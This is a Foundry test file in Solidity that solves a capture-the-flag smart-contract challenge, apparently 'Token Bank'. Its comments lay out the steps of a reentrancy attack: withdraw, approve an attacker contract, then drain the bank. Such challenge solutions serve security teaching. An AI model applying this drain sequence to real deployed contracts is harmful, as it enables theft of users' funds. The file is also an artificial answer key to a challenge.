// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/TokenBank.sol";

contract TankBankTest is Test {
    TokenBankChallenge public tokenBankChallenge;
    TokenBankAttacker public tokenBankAttacker;
    address player = address(1234);

    function setUp() public {}

    function testExploit() public {
        tokenBankChallenge = new TokenBankChallenge(player);
        tokenBankAttacker = new TokenBankAttacker(address(tokenBankChallenge));

        // Put your solution here

        vm.startPrank(player);

        // 1. Player withdraws tokens from the bank
        uint256 playerBalance = tokenBankChallenge.balanceOf(player);
        tokenBankChallenge.withdraw(playerBalance);

        // 2. Player approves the bank attacker contract to spend all the tokens
        tokenBankChallenge.token().approve(
            address(tokenBankAttacker),
            playerBalance
        );

        // 3. Player attacks the bank
        // - Transfers all the tokens to the attacker contract
        // - Deposits the tokens to the bank
        // - Withdraws the tokens from the bank with reentrancy attack
        // - Transfers all the tokens back to the player
        tokenBankAttacker.attack();

        vm.stopPrank();

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(tokenBankChallenge.isComplete(), "Challenge Incomplete");
    }
}
